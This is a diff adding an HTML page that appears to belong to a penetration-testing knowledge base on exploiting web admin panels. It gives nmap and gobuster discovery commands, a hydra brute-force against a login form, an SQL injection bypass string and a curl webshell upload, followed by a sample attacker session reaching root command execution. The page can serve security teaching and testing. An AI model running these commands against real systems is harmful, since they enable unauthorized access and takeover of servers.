@@ -1,0 +1,169 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">Admin Panels Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Web Applications</strong> • Focus: <strong>Admin Panel Abuse & Privilege Escalation</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    Admin Panels are privileged web interfaces used to manage applications, servers, 
+    and infrastructure. Exposed panels often lack strong authentication, run with 
+    default credentials, or contain exploitable vulnerabilities. Attackers exploit 
+    admin panels for unauthorized access, privilege escalation, data theft, and 
+    remote code execution. Compromising an admin panel typically provides attackers 
+    with high-impact access to the underlying system or application environment.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>Default Credentials:</strong> Many admin panels ship with known default logins.</li>
+    <li><strong>Weak Authentication:</strong> No MFA, weak passwords, brute-forceable login pages.</li>
+    <li><strong>Unrestricted Exposure:</strong> Admin interfaces left exposed to the internet.</li>
+    <li><strong>Vulnerable Frameworks:</strong> Panels often built on outdated CMS/frameworks.</li>
+    <li><strong>Privilege Abuse:</strong> Once logged in, attackers gain full control over systems.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify admin panels via port scanning, dirbusting, or search engines (Shodan).</li>
+    <li><strong>Authentication Bypass:</strong> Brute force, SQLi, default creds, or misconfig exploitation.</li>
+    <li><strong>Privilege Escalation:</strong> Abuse panel features (e.g., file upload, command execution).</li>
+    <li><strong>Exploitation:</strong> Deploy webshells, modify configs, steal data, or pivot inside the network.</li>
+    <li><strong>Impact:</strong> Complete compromise of the application, database, or host system.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan network for web services (80, 443, 8080, 10000, etc.).</li>
+    <li>Identify login pages and fingerprint panel type (Tomcat, Webmin, phpMyAdmin, etc.).</li>
+    <li>Attempt authentication bypass (default creds, brute force, SQL injection).</li>
+    <li>Enumerate panel features for upload/RCE functionality.</li>
+    <li>Escalate privileges and pivot further into the environment.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p80,443,8080,8443,10000 [target]
+gobuster dir -u http://[target] -w /usr/share/wordlists/dirb/common.txt
+
+# ------------------------------
+# Default Credentials
+# ------------------------------
+hydra -L users.txt -P passwords.txt http-post-form "/admin/login.php:user=^USER^&pass=^PASS^:Invalid login"
+
+# ------------------------------
+# Authentication Bypass (SQLi)
+# ------------------------------
+admin' OR '1'='1 -- 
+password: anything
+
+# ------------------------------
+# Exploiting Upload Functions
+# ------------------------------
+# Upload webshell.php disguised as image
+curl -F "file=@webshell.php" http://[target]/admin/upload.php
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p8080 192.168.1.200
+gobuster dir -u http://192.168.1.200:8080 -w common.txt
+hydra -L admin.txt -P rockyou.txt http-get://192.168.1.200:8080/admin
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p8080 192.168.1.200
+PORT     STATE SERVICE
+8080/tcp open  http-proxy
+
+[ saide ~ ]$ gobuster dir -u http://192.168.1.200:8080 -w common.txt
+/admin
+/login
+/uploads
+
+[ saide ~ ]$ hydra -l admin -P rockyou.txt http-post-form "/admin/login.php:user=^USER^&pass=^PASS^:Invalid login"
+[8080][http-post-form] host: 192.168.1.200   login: admin   password: admin123
+
+[ saide ~ ]$ curl -F "file=@webshell.php" http://192.168.1.200:8080/admin/uploads
+[+] File uploaded successfully
+
+[ saide ~ ]$ curl http://192.168.1.200:8080/uploads/webshell.php?cmd=id
+uid=0(root) gid=0(root) groups=0(root)
+
+[+] Remote Code Execution achieved via admin panel
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample Admin Panel exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Service Discovery
+8080/tcp open  http-proxy
+
+# Weak Credentials
+admin : admin123
+
+# Exploitation
+File upload → webshell.php executed
+
+# Proof of Exploitation
+id → uid=0(root) gid=0(root)
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting Web Apps
+      </a>
+    </li>
+    <li>
+      <a href="https://owasp.org/www-project-top-ten/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        OWASP Top 10 – Web Application Security Risks
+      </a>
+    </li>
+    <li>Red Team workflow: Discover → Fingerprint panel → Brute/bypass auth → Abuse features (uploads, configs) → Gain RCE.</li>
+  </ul>
+</section>
